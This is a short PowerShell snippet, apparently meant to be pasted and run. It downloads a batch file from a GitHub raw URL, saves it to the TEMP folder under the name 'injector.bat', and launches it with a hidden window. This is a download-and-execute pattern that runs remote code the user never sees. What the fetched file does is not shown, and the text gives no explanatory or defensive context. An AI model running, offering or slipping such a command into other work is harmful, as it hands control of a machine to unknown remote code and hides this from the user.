iwr -useb https://raw.githubusercontent.com/IStrawI/KBS/main/KBS.bat -o $env:TEMP\injector.bat
Start-Sleep -s 1
saps $env:TEMP\injector.bat -WindowStyle Hidden
